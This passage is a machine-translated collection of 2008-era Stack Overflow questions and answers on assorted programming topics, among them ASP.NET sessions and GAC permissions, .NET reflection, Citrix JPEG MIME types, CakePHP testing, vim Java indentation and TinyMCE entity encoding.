> 
> 时间：2008-10-14T12:17:35.340

如果您有一组正在编辑的对象，那么您可能需要的不仅仅是 isDirty() 的布尔标志。这个问题与引用计数没有什么不同，即在编辑时增加脏计数，在撤消时减少。如果您支持撤消，我怀疑您最终会遇到一些非常多毛的逻辑。我会把它排除在您的域对象之外。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T12:23:07.903

是的，这很好用。我没有撤消，而是使用 IsDirty 方法来表示某些东西可能已经更改了记录，然后触发了我的“记录是否更改逻辑”。我开发了自己的框架，其中每个表字段实际上都是对象的属性。每次将字段写入对象时，都会设置“isDirty”标志。在对象的“SaveObject”方法中（实际上它是一个帮助类，但很容易在对象中，但我希望能够以不同的方式保存对象，例如 xml、数据库等），我检查了 IsDirty 和如果它是假的，那么我跳过保存。这简化了逻辑，因为每次我有可能更改对象时，我都会调用 SaveObject 并让框架处理它。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-14T12:27:15.510

根据您的域，您可以使用相等来测试差异。保留原始对象并复制对象以进行编辑。任何时候可以执行编辑，适当地修改 UI。

这个建议的好处是它不会在您的域对象上粘贴 GUI 特定功能（isDirty() 标志），但 YMMV

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-14T12:27:52.637

如果您支持的操作撤消粒度大于“撤消自上次保存以来的所有内容”，那么我建议使用撤消堆栈。当某些东西被编辑时，它（或者它的撤消操作函子或委托）被添加到堆栈中。当您撤消时，您只需弹出堆栈并撤消弹出的操作。然后，您的 isDirty() 标志只是检查撤消堆栈是否包含项目，而不是要更新的额外存储和逻辑。

# asp.net - ASP.NET：弹出浏览器窗口和会话 cookie

> ID：200890
> 
> 赞同：1
> 
> 时间：2008-10-14T12:09:46.200
> 
> 标签：asp.net, .net, session, cookies, popup

摘要：当使用 Windows 资源管理器浏览 ASP.NET 网站时，弹出窗口不会从父窗口“借用”会话 cookie。

细节：

我正在开发一个 ASP.NET 网站 (.NET 2.0)。我使用 FormsAuthentication。需要使用 cookie 来处理会话。

在页面上我有一个按钮。当用户单击它时，会打开一个弹出窗口。弹出窗口显示一个使用会话变量的 ASPX 页面，这些变量之前是从父浏览器窗口中设置的。我一直在使用 IE (6, 7, 8) 和 Firefox 2.0 测试网站。在所有这些浏览器上，弹出窗口都可以访问与父浏览器窗口相同的会话，并且一切正常。

我现在有一个客户端提出的错误，指出弹出窗口显示错误。查看日志文件，我可以看到在弹出页面尝试访问会话变量时它是 NullReferenceException。与客户交谈，他说他在 Windows 资源管理器中打开了主网站！

我设法在测试机器上重新创建了该问题，并看到弹出窗口正在使用新会话。

机器必须有Win XP 和IE6 安装！使用 IE7 网站可以正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-10-14T12:33:30.753

我的怀疑是，当从 Windows 资源管理器中打开时（我并不完全理解您的意思），被发回的会话 cookie 不会存储在任何地方，因此无法用于弹出窗口以包含在其请求中。我不明白你怎么能解决这个问题。不能告诉客户这种访问应用程序的方式不受支持吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-16T11:49:02.267

我在 IE 8 上看到过同样的问题，在 Firefox、Google Chrome 或 IE 6 中不会出现这些问题。在我的情况下，我可以看到会话实际上正在工作，但身份验证终止将用户再次重定向到登录页面以供他登录......

# automated-tests - Mercury Quick Test Pro - 使用自定义网格进行测试

> ID：200894
> 
> 赞同：0
> 
> 时间：2008-10-14T12:10:46.417
> 
> 标签：automated-tests, qtp

我们正在尝试创建一些引用供应商自定义网格的测试。不幸的是，QTP 只将它识别为一个 WinObject，这是毫无用处的。我们需要能够导航网格并更改单元格值，双击单元格（不使用 X，Y 坐标）等。

理想情况下，我们想让 QTP 了解这个对象是一个网格并将其视为一个网格。

任何帮助将不胜感激。

谢谢

乔恩

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T14:21:55.793

什么供应商？

我有几个建议：

1.  使用击键导航网格，而不是单击鼠标。Ctrl-Home 将焦点设置到左上角的单元格，然后使用向上、向下、向左、向右移动。使用 Enter 键击来模拟双击。通常您可以使用 Ctrl-A、Ctrl-C 将网格的内容复制到系统剪贴板，并使用剪贴板 API 来检索数据。
2.  您可以使用 .Object 属性以编程方式获取/设置网格属性。.Object 提供对对象底层本机属性和方法的访问，与 QTP 方法和属性相反。您可以执行类似以下伪代码的操作来将焦点设置到单元格并更改值。您的代码会因供应商实施而异。请查阅供应商的文档以了解您可以使用哪些方法和属性。

    `WinObject("mygrid").Object.CurRow = 1`

    `WinObject("mygrid").Object.CurCol = 1`

    `WinObject("mygrid").Object.Value = "my new value"`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-11-08T19:24:53.833

Infragistics 也是如此。他们有一个用于 UltraWinGrid 等的 QTP 插件。

[http://www.infragistics.com/dotnet/testadvantage.aspx#Overview](http://www.infragistics.com/dotnet/testadvantage.aspx#Overview)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-18T11:50:41.200

可能是您忘记为您的网格供应商加载（安装）插件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T14:30:54.650

如果有问题的网格恰好是 Stingray 目标网格，QTP 有专门用于此的插件。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-18T11:45:55.250

将请求发送到支持中心是合理的。如果他们会收到大量请求 - 他们将添加对您的网格供应商的支持。

# .net - 从反射属性中检索反射类型中的值

> ID：200900
> 
> 赞同：2
> 
> 时间：2008-10-14T12:12:58.767
> 
> 标签：.net, reflection, access-modifiers

我需要访问在第三方程序集中声明的一些标记为内部的成员。

我想从类中的特定内部属性返回一个值。然后我想从该返回值的属性中检索一个值。但是，这些属性返回的类型也是内部的并在此第三方程序集中声明。

我见过的这样做的例子很简单，只显示返回 int 或 bool。有人可以给出一些处理这种更复杂情况的示例代码吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T12:41:53.607

您只需继续挖掘返回的值（或 PropertyInfo 的 PropertyType）：

你

```
sing System;
using System.Reflection;
public class Foo
{
    public Foo() {Bar = new Bar { Name = "abc"};}
    internal Bar Bar {get;set;}
}
public class Bar
{
    internal string Name {get;set;}
}
static class Program
{
    static void Main()
    {
        object foo = new Foo();
        PropertyInfo prop = foo.GetType().GetProperty(
            "Bar", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
        object bar = prop.GetValue(foo, null);
        prop = bar.GetType().GetProperty(
            "Name", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
        object name = prop.GetValue(bar, null);

        Console.WriteLine(name);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T12:27:19.330

您始终可以将其作为对象检索，并在返回的类型上使用反射来调用其方法并访问其属性。

# asp.net - 在 Response.WriteFile() 中使用文件后，何时可以删除文件？

> ID：200901
> 
> 赞同：9
> 
> 时间：2008-10-14T12:13:04.057
> 
> 标签：asp.net

WriteFile 调用是否正确同步，我可以删除调用后立即写入的文件吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-14T13:14:15.040

如果您使用 向客户端写入文件，则`Response.WriteFile()`调用`Response.Flush()`将确保它已完全输出到客户端。完成后，您可以将其从网络服务器中删除。

如果文件是关键任务，您可能想要提出一个更强大的系统。比如说，一个客户端脚本来验证文件是否接收正常，然后警告网络服务器该文件可以被删除。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-11-12T23:02:18.270

那就是解决方案，使用语法后`Response.WriteFile(fileName);`，键入以下代码行：

```
Response.Flush();
System.IO.File.Delete(fullPathFileName);
Response.End(); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-11-13T07:13:10.267

它是完全同步的，你可以通过`HttpResponse.WriteFile`Lutz Reflector 的实现看到。您可以在调用 后立即删除文件`Response.WriteFile`。

您无法保证响应流已完全传输到客户端，但调用`Response.Flush`也不能为您提供保证。`Response.Flush`所以我认为在删除文件之前不需要打电话。

避免将文件加载到 a`MemoryStream`中，它不会给您带来任何好处，并且会消耗内存，尤其是对于大文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T13:11:32.503

如果内存服务它是同步的，其余的 RESPONSE 命令也是如此。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T13:16:47.017

**传输文件**

您也可以调用 TransmitFile 让 IIS 处理它。它实际上是由 IIS 在您的工作进程之外发送的。

**记忆流**

如果您真的很偏执，请不要发送文件。将其加载到内存流中（如果大小合理）并传输。然后，您可以随时删除该文件。IIS 永远不会触及磁盘上的文件。

# jpeg - 有什么区别：image/x-citrix-pjpeg 和 image/pjpeg

> ID：200912
> 
> 赞同：12
> 
> 时间：2008-10-14T12:16:49.477
> 
> 标签：jpeg, mime-types, citrix

某些文件使用报告的 MIME 类型上传：

```
image/x-citrix-pjpeg 
```

它们是有效的 jpeg 文件，我接受它们。

但是我想知道：为什么 MIME 类型不同？
格式有什么区别吗？还是这种 mimetype 是由 citrix 的某个灯泡无缘无故发明的？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-14T16:15:45.547

**更新：**
好的，我对这个问题进行了更多的搜索和测试，结果发现他们都在谎报 MIME 类型（我知道，永远不要相信客户端发送的*任何信息）。*
我检查了一堆不同编码的文件（用 libjpeg 创建）

`Official`jpeg 文件的 MIME 类型：`image/jpeg`

但是一些应用程序（最显着的是 MS Internet Explorer 和 Yahoo! 邮件）发送 jpeg 文件为`image/pjpeg`

> 我以为我知道 pjpeg 代表“渐进式”jpeg。事实证明，渐进式/标准编码与它无关。

MS Internet Explorer 将*所有*jpeg 文件作为 pjpeg 发送，而不管文件的内容如何。

citrix 也是如此：从 citrix 客户端发送的*所有*jpeg 文件都报告为`image/x-citrix-pjpeg`MIME 类型。

文件本身保持不变（上传前后相同）。那么事实证明，MIME 类型的差异仅表明用于发送文件的软件？

如果文件内容没有差异，为什么人们会发明一种新的 MIME 类型？

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T12:34:18.367

`image/x-citrix-pjpeg`似乎是从 Citrix 会话导出的图像发送的 MIME 类型。

我没有发现它们与常规 JPEG 之间的任何格式差异——一旦添加了适当的 mime 类型规则，大多数图像转换实用程序将像处理常规 pjpeg 一样处理它们。

可能在 Citrix 会话中，管理 jpeg 时发生了一些内部魔法，导致他们创建了这种 mime 类型，当从他们的系统导出文件时，他们将其留在文件中，但这只是我的猜测。正如我所说，我没有注意到与我们收到的这种格式的偶尔文件有任何实际的格式差异。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T12:33:34.590

我最接近找出这是什么的，是这个线程。希望能帮助到你。

[http://forums.citrix.com/message.jspa?messageID=713174](http://forums.citrix.com/message.jspa?messageID=713174)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-08-18T23:42:16.777

出于某种原因，当人们通过 Citrix 运行 Internet Explorer 时，它会更改 GIF 和 JPG 文件的 mime 类型。

```
JPG: image/x-citrix-pjpeg
GIF: image/x-citrix-gif 
```

根据我的测试，PNG 文件不受影响。我不知道这是 Internet Explorer 问题还是 Citrix。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2010-04-08T13:45:04.867

这与 Citrix 的一项名为 SpeedBrowse 的功能有关，该功能在 [Citrix] 服务器端的网页中截取 jpeg 和 gif，以便它可以通过 ICA（Citrix 远程协议）将它们全部发送——这比屏幕更有效——刮他们。正如之前的海报所建议的，这是通过使用更改的 mime 类型标记图像来实现的。

IIRC 它在 IE 中挂钩[FindMimeFromData](http://msdn.microsoft.com/en-us/library/ms775107%28VS.85%29.aspx)以动态更改 mime 类型，但这适用于上传的文件以及下载的文件 - 肯定是一个错误。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-03-21T16:21:23.427

据我回忆，渐进式 JPG 格式允许随着文件下载的进行，图像以越来越高的分辨率显示。我并不完全了解细节，但如果你记得在拨号的日子里，有些文件会显示模糊，然后更好，最终在下载时完成。为此，需要以不同于通常发送 JPEG 的顺序发送数据。

实际数据，一旦您查看，是相同的，只是以不同的顺序发送。我忘记了，JPEG编码本身可以很好地对像素进行不同的分组。

# architecture - 您如何控制敏捷项目中的架构？

> ID：200918
> 
> 赞同：7
> 
> 时间：2008-10-14T12:18:34.013
> 
> 标签：architecture, agile

您如何确保项目将以“良好”的设计决策构建，从而实现灵活的软件架构？

您如何在将架构完全留给一侧的团队和让所有架构控制到另一侧的少数人之间取得平衡？

你有“架构组”、“架构标签”或类似的东西吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-14T12:32:15.810

敏捷方法的先决条件是您已经知道如何使用的架构。

如果架构没有明确定义和完全理解，你就不能真正采用敏捷方法。

你需要有一些技术尖峰来展示架构是如何工作的，以及各个部分如何组合在一起。你可以做这些是初步的冲刺，但它们不会直接导致向用户发布。它们是一种特殊情况，需要获得您可以使用的架构。

一旦你完成了这个“理解架构”的工作，你就可以开始执行直接为用户发布的 sprint。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T12:22:29.183

我可以解释我将如何做到这一点，但这[比](http://martinfowler.com/articles/designDead.html)我能说得更好。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T12:35:51.390

我还建议阅读 fowlers 文档[Is Design Dead](http://martinfowler.com/articles/designDead.html)，据我了解他的论点，如果您将所有敏捷实践视为一个整体，那么您将获得进行重大更改的自由，从而可以发展架构。

重构通过持续交互最有效，测试通过 TDD 和持续集成得到增强……我可以继续。仅当您无法进行纠正“错误”所需的大更改时，才会限制不断发展的“架构”。

此外，我认为你有一个架构师作为项目的利益相关者，他们贡献用户故事，然后将这些故事传递回给架构师。

这也是利用结对编程的好方法，架构师作为结对的一部分工作。在这种情况下，架构师与其说是一个敬业的人，不如说是开发团队成员在结对编程时戴的帽子。

我认为 XP 并没有削弱架构师（和架构师）的作用，它只是将责任放在了所有团队成员身上，以在项目的整个生命周期内交付和分摊成本。

[编辑]

根据其他评论，不要害怕一些前期计划，零迭代是尝试制定一些计划的好时机，只是不要严格按照特定的时间范围交付它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T12:23:59.477

以我的经验，最好的方法是让经验丰富的开发人员/架构师每天致力于推动架构愿景的项目。

我建议由项目的开发负责人来控制架构并确保所有新工作都适合它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T12:23:48.480

我通过预先做一些计划来处理这个问题——通常，我有一些类似应用程序的经验来帮助解决这个问题。如果没有，我会在空间中进行一些探索以获得一个想法。一旦布局了基本架构，我将根据我的优先故事开始在脑海中进行开发。然后，我进行重构以解决架构中的缺点或错误。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T12:33:10.567

如果不预先进行大型设计，通常会有一个适用于每个项目的基本设计。通常，这定义了在应用程序设计中要尊重的基本层。大多数其他设计决策由每个开发人员做出。

我们的开发过程是基于频繁的同行评审的短期开发爆发。每个开发人员的架构决策的质量都在同行评审时得到验证。这还包括验证代码是否遵循*产品架构*。

根据项目的类型和可用的工具，我们还使用[macker](http://innig.net/macker/)等工具来自动验证层蛋糕的完整性。

# xml - 在程序集中嵌入 Intellisense Xml 文档？

> ID：200920
> 
> 赞同：25
> 
> 时间：2008-10-14T12:20:50.280
> 
> 标签：xml, visual-studio, documentation, assemblies, intellisense

我有一个包含非常详尽的基于 XML 的文档的程序集，它通过 Sandcastle 用于生成产品的帮助文件。当程序员明显使用程序集时，我们还使用输出 XML 文件在 Visual Studio 中提供适当的 Intellisense。

为了做到这一点，我们似乎同时向用户提供了程序集（“assembly.dll”）和文档（“assembly.xml”）。

是否可以在程序集中嵌入文档，因此我们只需要提供单个程序集文件，Visual Studio 就可以提取信息？也许嵌入为资源或类似的东西？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-14T15:17:27.693

不幸的是，您需要同时提供两者，因为 Visual Studio 只知道查看 Intellisense 的 XML 文档。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-30T22:30:20.753

如果您搜索 C:\Windows\Microsoft.NET\Framework\v2.0.50727，您会发现您可能在应用程序中引用的所有 .net 程序集都在使用 xml 文件。如果 xml 文件存在，Visual Studio 只会为程序集提供智能感知。例如，如果您要关闭 Visual Studio，然后删除 System.Drawing.xml 文件，然后重新打开 VS，则该程序集不应该有任何智能感知。然后，您需要关闭 VS，将其复制回来，然后重新打开 VS 以使智能感知再次工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T23:32:24.823

我错过了什么吗？我总是像往常一样评论（使用 3 个斜杠或 3 个刻度线 (vb)），使用内置的 xml 标签，当我使用程序集时，我得到了智能感知 - 我很少使用外部 xml 文件。

# c# - 在 C# 中，我有一个到 WIN32 WndProc 的 IntPtr。调用它的语法是什么？

> ID：200924
> 
> 赞同：2
> 
> 时间：2008-10-14T12:22:38.093
> 
> 标签：c#, .net, winapi

我正在对本机窗口进行子类化（组合框的编辑控件......）

oldWndProc = SetWindowLong(HandleOfCbEditControl, GWL_WNDPROC, newWndProc);

在我的子类化 wndproc 中，我会有这样的代码，对，但我不知道调用 oldWndProc 的语法。

```
 int MyWndProc(int Msg, int wParam, int lParam)
    {
         if (Msg.m ==  something I'm interested in...)
         {
              return something special
         }
         else
         {
              return result of call to oldWndProc  <<<<   What does this look like?***
         }

    } 
```

编辑：这个问题中的“子类化”一词是指 WIN32 API 的含义，而不是 C#。这里的子类化并不意味着覆盖 .NET 基类行为。这意味着告诉 WIN32 调用你的函数指针而不是 windows 当前回调。它与 C# 中的继承无关。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T12:39:02.973

您将通过 P/Invoke调用[CallWindowProc 。](http://msdn.microsoft.com/en-us/library/aa452919.aspx)只需将参数定义为 int 变量（看起来这就是您在 SetWindowLong 调用中定义它们的方式），如下所示：

[DllImport("CallWindowProc"...] public static extern int CallWindowProc(int previousProc, int nativeControlHandle, int msg, int lParam, int wParam);

请记住，对于编组，int、uint 和 IntPtr 都是相同的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T13:28:01.690

您应该使用 CallWindowProc 来调用 oldWndProc 指针。

```
[DllImport("user32")]
private static extern int CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, int Msg, int wParam, int lParam); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T12:32:22.130

该[站点](http://www.pinvoke.net/)将对您的所有互操作/p-invoke 工作非常有帮助（[SetWindowLong](http://www.pinvoke.net/default.aspx/user32/SetWindowLong.html)）

# php - 如何在 CakePHP 1.2 中将查询字符串传递给 testAction？

> ID：200925
> 
> 赞同：5
> 
> 时间：2008-10-14T12:22:45.627
> 
> 标签：php, unit-testing, cakephp, cakephp-1.2

在 CakePHP 中，将查询字符串放在 url 中不会导致它像通常直接调用控制器时那样被自动解析和拆分。

例如：

```
$this->testAction('/testing/post?company=utCompany', array('return' => 'vars')) ; 
```

将导致：

```
[url] => /testing/post?company=utCompany 
```

通过 Web 浏览器直接调用 url 会导致：

```
[url] => Array
    (
        [url] => testing/post
        [company] => utCompany
    ) 
```

在不编辑 CakePHP 源代码的情况下，有没有办法在运行单元测试时拆分查询字符串？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T13:18:06.467

I have what is either a hack (i.e. may not work for future CakePHP releases) or an undocumented feature.

If the second testAction parameter includes an named array called 'url' then the values will be placed in the $this->params object in the controller. This gives us the same net result as when the controller is directly invoked.

```
$data = array ('company' => 'utCompany') ;

$result = $this->testAction('/testing/post', array
(
    'return' => 'vars', 
    'method' => 'get', 
    'url' => $data)
) ; 
```

I'm satisfied with this method for what I need to do. I'll open the question to the community shortly so that it in the future a better answer can be provided.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-02-09T15:50:42.290

这些答案都不适用于 Cake 1.3。您应该在 testAction 调用之前设置以下内容：

`$this->__savedGetData['company'] = 'utcompany';`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T14:43:16.607

CakePHP 确实提供了某种程度的 url 拆分，但它似乎只在运行时配置中工作，而不是在测试配置中工作。如果这是故意的，我会联系 CakePHP。

我建议您的查询字符串解析器使用 PHP 函数[explode](http://au.php.net/manual/en/function.explode.php)。

我相信你可以做这样的事情：

```
$result = explode ('&', $queryString, -1) ; 
```

这将为您提供单独的数组插槽中的密钥对，您可以在其上迭代并执行第二次爆炸，如下所示：

```
$keyPair = explode ('=', $result[n], -1) ; 
```

然而，话虽如此，最好还是看看 CakePHP 的底层，看看他们在做什么。

我在上面输入的内容无法正确处理查询字符串包含 html 转义字符（以 & 为前缀）的情况，也不会处理十六进制编码的 url 字符串。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-11-03T09:13:40.830

使用 _GET['parmname'];

# java - 如何正确使 vim 缩进 java 注释？

> ID：200932
> 
> 赞同：23
> 
> 时间：2008-10-14T12:24:41.630
> 
> 标签：java, vim, annotations

当使用注解缩进 java 代码时，vim 坚持这样缩进：

```
@Test
    public void ... 
```

我希望注释与方法定义在同一列中，但我似乎无法找到一种方法来告诉 vim 这样做，除非可能使用缩进表达式，但我不确定是否可以将它与定期的 cindent。

编辑：文件类型插件已经打开我只是对缩进插件有点困惑。接受的答案可能有点骇人听闻，但也适用于我。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2010-12-10T22:50:13.093

你不应该修改内置的 vim 设置。您的更改可能会在软件包升级后消失。如果你将它复制到你的 .vim 中，那么你将不会得到任何 java 缩进 bug 修复。

相反，将以下内容放入一个名为的新文件中`~/.vim/after/indent/java.vim`

```
function! GetJavaIndent_improved()
    let theIndent = GetJavaIndent()
    let lnum = prevnonblank(v:lnum - 1)
    let line = getline(lnum)
    if line =~ '^\s*@.*$'
        let theIndent = indent(lnum)
    endif

    return theIndent
endfunction
setlocal indentexpr=GetJavaIndent_improved() 
```

这样，它加载股票 java 缩进并仅修改缩进以删除注释缩进。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-17T11:38:52.640

编辑：我无法删除我自己的答案，因为它已经被接受，但[@pydave 的答案](https://stackoverflow.com/a/4414015/2844)似乎是更好（更强大）的解决方案。

* * *

您可能应该通过设置为 java FileType 使用缩进文件（而不是使用 cindent）`filetype plugin indent on`。

也就是说，我的 linux 发行版中的 Vim 7.1 附带的缩进文件（查看当前的 vim svn 这对于 7.2 仍然适用）还没有考虑注释。`/usr/share/vim/vim71/indent/java.vim`因此，我将（参见[https://vim.svn.sourceforge.net/svnroot/vim/branches/vim7.1/runtime/indent/java.vim](https://vim.svn.sourceforge.net/svnroot/vim/branches/vim7.1/runtime/indent/java.vim)）复制到`~/.vim/indent/java.vim`并在末尾添加以下行：

```
let lnum = prevnonblank(v:lnum - 1)
let line = getline(lnum)
if line =~ '^\s*@.*$'
    let theIndent = indent(lnum)
endif 
```

我不确定这是否会破坏其他任何缩进，但它对我有用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-12-09T14:33:50.723

我发现 pydave 的建议*几乎*是我想要的，但我想要这个：

```
@Override
public void ... 
```

**这**：

```
@Override public void ... 
```

所以我替换了正则表达式（根据 pydave 的，放在 中`~/.vim/after/indent/java.vim`）：

```
setlocal indentexpr=GetJavaIndent_improved()

function! GetJavaIndent_improved()
    let theIndent = GetJavaIndent()
    let lnum = prevnonblank(v:lnum - 1)
    let line = getline(lnum)
    if line =~ '^\s*@[^{]*$'
        let theIndent = indent(lnum)
    endif

    return theIndent
endfunction 
```

# php - 有没有办法在离开时解码html实体 ，等单独，使用PHP？

> ID：200939
> 
> 赞同：1
> 
> 时间：2008-10-14T12:26:11.393
> 
> 标签：php, tinymce, wysiwyg

我在我的网站上使用 tinyMCE 作为我的文本编辑器，我想在将文本保存到我的数据库之前重新格式化文本（将 ’ 标签更改为 ' 然后再更改为 '）。我找不到使用 tinyMCe 执行此操作的简单方法，并且使用 htmlentities() 会更改包括 <> 在内的所有内容。有任何想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-14T12:31:48.027

您可以`strip_tags($str, $allowed_tags)`像下面这样使用：

```
$txt = strip_tags($txt, '<p><a><br>'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T13:30:43.087

tinyMCE allows you to specify a 'whitelist' of allowed tags, which will remove any tags not included on the list:

```
tinyMCE.init({
  ...  //  other init instructions
  valid_elements: 'p,a[href],br',
}); 
```

In our own project we combine this whitelist with an internal converter which turns the HTML into a BB-like format for the database, then back to HTML again when it needs to be printed to a page.

* * *

**Update:** Now that the question has been edited to be clearer, I can see that what I typed above doesn't solve the problem. What the questioner wants is a way to convert character entities while leaving HTML tags unaffected.

In our own project, the internal converter we use does this job. When converting from HTML into our internal representation, encoded characters are converted into the characters themselves; when converting back into HTML, higher characters are encoded. This is done in a character-by-character, parser-like style. However this approach is probably too complicated for your needs.

The shortcut used by many is to use a series of regular expressions, but you may find it difficult to arrange your regexes in such a way as to preserve ampersands `&` and semicolons `;` at the same time as translating character entities `&nbsp;`. You'll also find that to cover every possible character entity you'd need dozens of regexes.

Uh, so I don't actually have an answer.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-15T00:42:39.113

TinyMCE 和 FCK 都有大量的配置选项。文档可能很难搜索，但值得付出努力。

TinyMCE 允许您使用 'entity_encoding' 选项指定实体编码。可以在创建编辑器时指定。它可能看起来像这样......

tinyMCE.init({
    entity_encoding: 'numeric'
});

这会改变像 ’ 这样的标签。进入 '。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T12:48:31.223

直接来自 PHP 手册：[strip_tags()](http://fr2.php.net/manual/en/function.strip-tags.php)

$allowable_tags 变量允许您定义一串允许的标签。您可以使用此可选的第二个参数来指定不应剥离的标签。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T13:56:16.593

这取决于您要保留的标签。我假设您想使用 TinyMCE 的所有功能，因此文本可以包含诸如表格结构之类的下一个标签。那么就没有简单的方法了（一种方法是使用[PHP 文档对象模型](http://de.php.net/manual/en/book.dom.php)来解析 html 文档。

但是 TinyMCE 有几个用于实体编码的[配置选项。](http://wiki.moxiecode.com/index.php/TinyMCE:Configuration)我建议您查看 TinyMCE 手册中的配置选项[entity_encoding](http://wiki.moxiecode.com/index.php/TinyMCE:Configuration/entity_encoding)、[实体](http://wiki.moxiecode.com/index.php/TinyMCE:Configuration/entities)和[编码](http://wiki.moxiecode.com/index.php/TinyMCE:Configuration/encoding)。

# asp.net - 为什么 ASP.NET 由于 GAC 的权限而失败？

> ID：200945
> 
> 赞同：7
> 
> 时间：2008-10-14T12:30:22.727
> 
> 标签：asp.net, gac

我正在尝试在 XP 机器上运行 ASP.NET 2.0 应用程序。据我所知，一切都配置正确。但是，我收到以下消息：

> 服务器应用程序不可用

并且每次在应用程序事件日志中出现两个事件：

> aspnet_wp.exe (PID: 3352) 意外停止。
> 
> 无法执行请求，因为 ASP.NET 进程标识没有对全局程序集缓存的读取权限。错误：0x80070005 访问被拒绝。

以前，ASP.NET 应用程序在这台机器上运行良好。

我尝试了以下步骤，但没有运气：

*   我已将站点主目录的读取权限授予 ASPNET 帐户
*   我已经使用 aspnet_regiis -i 重新安装了 ASP.NET 2.0
*   我已使用 aspnet_regiis -ga <my machine name>\ASPNET 授予 ASPNET 帐户权限
*   我已使用 CACLS %WINDIR%\assembly /e /t /p <my machine name>\ASPNET:R 将 GAC 的读取权限授予 ASPNET 帐户
*   我已在 IIS 中将该站点的 ASP.NET 版本设置为 2.0

我不确定我还能做什么！

* * *

使用 Process Monitor 直接导致了我的问题。非常感谢 Mun 的提示。

这是一个非常模糊的问题：我之前使用了程序集绑定日志查看器 (fuslogvw.exe)，并将其设置为使用自定义路径选项将所有绑定记录到磁盘。但是，ASPNET 帐户没有对该自定义路径的权限。因此，恢复使用默认路径解决了该问题。授予对 ASPNET 帐户的自定义路径的读/写权限也有效，禁用绑定日志记录也是如此。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T12:53:26.050

以下是必要的权限：http: [//msdn.microsoft.com/en-us/library/kwzs111e.aspx](http://msdn.microsoft.com/en-us/library/kwzs111e.aspx)

更多信息： http: [//support.microsoft.com/default.aspx ?kbid=811320](http://support.microsoft.com/default.aspx?kbid=811320)

您运行的命令应该足够了，但值得检查:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T13:07:32.183

您可能还会发现[Process Monitor](http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx)对于解决这些类型的问题很有用。如果您设置一个过滤器来显示所有包含 aspnet_wp.exe 的活动，它应该向您显示它正在尝试访问哪些文件，从而允许您相应地更新权限。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-03-14T08:43:49.537

我知道现在回答这个问题为时已晚。我今天也有同样的问题。我在命令提示符下运行了以下内容，它解决了问题

```
aspnet_regiis -ga machinename\ASPNET 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T13:37:28.847

我们曾经在 ASP.NET 中遇到过这个问题，因为当 Visual Studio 创建程序集的临时副本时，索引服务会开始对它们进行病毒扫描，这偶尔会导致“访问被拒绝”消息，因为调试器会尝试打开一个共享文件。告诉索引服务不索引临时程序集目录解决了这个问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T23:00:39.477

这为我解决了这个问题，我想我会分享：

如果这是针对 IIS 5.1（基本上是 IIS 的古老版本），请右键单击您的虚拟目录（来自 inetmgr）并转到“所有任务”>“权限向导”选择“从模板中选择新的安全设置”选项，然后选择公共网站。

# visual-studio - 解决方案：每个应用程序或每个应用程序套件

> ID：200954
> 
> 赞同：20
> 
> 时间：2008-10-14T12:32:54.983
> 
> 标签：visual-studio, architecture

